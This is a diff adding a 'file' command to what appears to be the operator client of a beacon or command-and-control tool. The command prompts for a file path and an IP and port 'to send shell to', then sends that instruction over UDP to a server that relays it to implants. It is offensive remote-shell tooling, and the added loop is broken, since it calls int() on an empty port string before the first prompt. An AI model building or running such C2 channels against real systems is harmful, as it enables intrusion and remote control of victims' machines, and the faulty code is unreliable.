@@ -61,6 +61,33 @@ def runInteractive(SERVER):
                     print("Socket timeout. Server may be down or otherwise unresponsive.")
                 if not (resp.decode() == "confirm"):
                     print("Server error. Action not performed.")
+            elif (entered == "file"):
+                filePath = ""
+                while not (len(filePath) > 0):
+                    filePath = input("Enter file path: ")
+                    if not (len(filePath) > 0):
+                        print("Invalid file path.")
+                ip = ""
+                while not (len(ip.split('.')) == 4):
+                    ip = input("Enter IP to send shell to: ")
+                    if not (len(ip.split('.')) == 4):
+                        print("Invalid IPv4 address entered.")
+                port = ""
+                while not ((int(port) > 0) and (int(port) <= 510)):
+                    port = input("Enter port to send shell to (1-510): ")
+                    if not ((int(port) > 0) and (int(port) <= 510)):
+                        print("Invalid port entered. Valid port range is 1-510.")
+                packet = "file:" + filePath + ":" + ip + ":" + port + ":" + selection
+                try:
+                    sock.sendto(packet.encode(),(SERVER, 10000))
+                except socket.timeout:
+                    print("Socket timeout. Server may be down or otherwise unresponsive.")
+                try:
+                    resp, _ = sock.recvfrom(512)
+                except socket.timeout:
+                    print("Socket timeout. Server may be down or otherwise unresponsive.")
+                if not (resp.decode() == "confirm"):
+                    print("Server error. Action not performed.")
             else:
                 printBeaconHelp()
         else:
